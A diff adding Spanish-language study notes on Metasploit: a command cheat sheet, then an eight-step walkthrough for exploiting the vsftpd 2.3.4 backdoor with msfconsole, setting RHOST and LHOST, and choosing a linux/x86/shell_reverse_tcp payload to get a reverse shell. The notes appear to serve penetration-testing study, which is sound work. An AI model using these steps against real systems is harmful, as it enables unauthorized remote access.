@@ -1,0 +1,95 @@
+**** METASPLOIT ****
+
+Iniciar Metasploit:
+Ejecuta msfconsole en la terminal para abrir la interfaz de línea de comandos de Metasploit.
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------
+
+Buscar un Módulo:
+Dentro de Metasploit, utiliza el comando search <nombre> para buscar módulos que coincidan con el nombre especificado.
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------
+
+Seleccionar un Módulo:
+Después de buscar, utiliza use <nombre-del-módulo> para seleccionar un módulo específico para su uso.
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------
+
+Configurar Opciones del Módulo:
+Utiliza show options para ver las opciones disponibles para configurar el módulo seleccionado.
+Utiliza set <opción> <valor> para configurar las opciones necesarias.
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------
+
+Ejecutar el Módulo:
+Una vez configurado el módulo, utiliza exploit para ejecutarlo y realizar la explotación.
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------
+
+Utilizar un Exploit:
+En Metasploit, puedes utilizar exploits específicos para aprovechar vulnerabilidades conocidas en sistemas.
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------
+
+Escuchar para Conexiones de Reverse Shell:
+Utiliza módulos de escucha para recibir conexiones de reverse shell, permitiendo el acceso a la máquina objetivo.
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------
+
+Payloads:
+Los payloads son cargas útiles que se entregan una vez que se ha explotado una vulnerabilidad. Pueden incluir reverse shells, comandos arbitrarios y más.
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------
+
+Post-Explotación:
+Metasploit ofrece módulos y herramientas para realizar tareas después de haber comprometido una máquina, como obtener información, moverse lateralmente, etc.
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------
+
+Reportes y Registro:
+Puedes utilizar comandos como workspace para organizar tus proyectos y db_* para interactuar con la base de datos de Metasploit.
+
+_______________________________________________________________________________________________________________________________________________________
+
+**** PASOS PARA ATACAR UNA VULNERABILIDAD CON METASPLOIT ****
+
+1. Iniciar Metasploit:
+Abre una terminal y ejecuta msfconsole para iniciar la interfaz de línea de comandos de Metasploit.
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+2. Buscar una Vulnerabilidad:
+Utiliza el comando search para buscar módulos relacionados con la vulnerabilidad que deseas explotar. Por ejemplo, si estás interesado en una vulnerabilidad en el servicio FTP, podrías ejecutar: search ftp.
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+3. Seleccionar un Módulo:
+Usa el comando use seguido del nombre completo del módulo para seleccionarlo. Por ejemplo: use exploit/unix/ftp/vsftpd_234_backdoor.
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+4. Mostrar Opciones del Módulo:
+Ejecuta show options para ver las opciones disponibles para configurar el módulo. Observarás que hay opciones como RHOST, LHOST y PAYLOAD.
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+5. Configurar RHOST y LHOST:
+Utiliza el comando set para configurar las opciones necesarias. Por ejemplo, set RHOST <dirección-IP> establece la dirección IP del objetivo y set LHOST <tu-dirección-IP> establece tu dirección IP para recibir la conexión de reverse shell.
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+6. Seleccionar un Payload:
+
+Ejecuta show payloads para ver la lista de payloads disponibles para ese módulo. Selecciona el payload que deseas utilizar. Por ejemplo, set PAYLOAD linux/x86/shell_reverse_tcp.
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+7. Configurar Opciones del Payload:
+Ejecuta show options nuevamente para ver las opciones específicas del payload que seleccionaste. Configura las opciones requeridas, como LPORT.
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+8. Ejecutar la Explotación:
+
+Después de configurar todas las opciones necesarias, ejecuta exploit para intentar explotar la vulnerabilidad y establecer una conexión de reverse shell.
+
